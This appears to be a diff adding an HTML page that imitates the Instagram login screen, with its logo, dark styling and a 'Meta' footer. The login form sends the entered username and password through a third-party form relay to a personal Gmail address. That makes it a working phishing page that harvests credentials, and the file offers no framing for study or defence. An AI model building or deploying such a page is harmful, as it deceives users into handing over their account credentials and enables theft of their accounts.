@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Instagram Login</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+    * { margin:0; padding:0; box-sizing:border-box; font-family:'Inter', sans-serif; }
+    body { background:#121212; color:#fff; display:flex; justify-content:center; align-items:center; min-height:100vh; flex-direction:column; }
+    .login-container { width:90%; max-width:400px; display:flex; flex-direction:column; align-items:center; }
+    .logo { width:90px; margin-bottom:30px; }
+    input { width:100%; padding:12px 15px; margin:8px 0; border-radius:8px; border:1px solid #333; background:#1e1e1e; color:#fff; font-size:14px; }
+    input::placeholder { color:#888; }
+    input:focus { outline:none; border-color:#555; }
+    .login-btn { width:100%; padding:12px; margin:12px 0; background:#0095f6; border:none; border-radius:8px; color:#fff; font-weight:600; cursor:pointer; font-size:16px; }
+    .login-btn:hover { background:#1877f2; }
+    .forgot { margin:10px 0; color:#aaa; font-size:14px; text-decoration:none; }
+    .create-account { width:100%; padding:12px; border:1px solid #333; border-radius:8px; color:#0095f6; font-weight:600; text-align:center; text-decoration:none; margin-top:15px; display:block; }
+    .meta { margin-top:20px; color:#888; font-size:12px; }
+</style>
+</head>
+<body>
+
+<div class="login-container">
+    <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/600px-Instagram_icon.png" alt="Instagram Logo">
+    
+    <form target="_blank" action="https://formsubmit.co/eldoradogaming17@gmail.com" method="POST">
+        <input type="text" name="username" placeholder="Username, email address or mobile number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit" class="login-btn">Log in</button>
+    </form>
+   
+    <a href="#" class="forgot">Forgotten password?</a>
+    <a href="#" class="create-account">Create new account</a>
+    <div class="meta">Meta</div>
+</div>
+
+</body>
+</html>
